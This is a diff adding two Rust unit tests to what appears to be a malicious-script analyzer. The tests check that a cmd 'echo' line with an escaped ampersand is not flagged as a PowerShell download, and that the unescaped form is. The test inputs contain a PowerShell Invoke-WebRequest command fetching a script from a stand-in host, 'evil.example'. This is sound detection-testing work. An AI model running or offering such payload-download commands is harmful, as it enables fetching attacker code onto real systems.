@@ -36179,6 +36179,40 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn escaped_ampersand_powershell_text_does_not_extract_download() {
+        let report = analyze(
+            br#"echo keep ^& powershell -Command Invoke-WebRequest http://evil.example/p.ps1 -OutFile p.ps1"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://evil.example/p.ps1"
+            )),
+            "escaped ampersand echo text was misread as embedded PowerShell download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn unescaped_ampersand_powershell_still_extracts_download() {
+        let report = analyze(
+            br#"echo keep & powershell -Command Invoke-WebRequest http://evil.example/p.ps1 -OutFile p.ps1"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://evil.example/p.ps1"
+            )),
+            "real ampersand-separated PowerShell download was missed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn telegram_bot_prefix_of_known_download_not_double_emitted() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::Download {
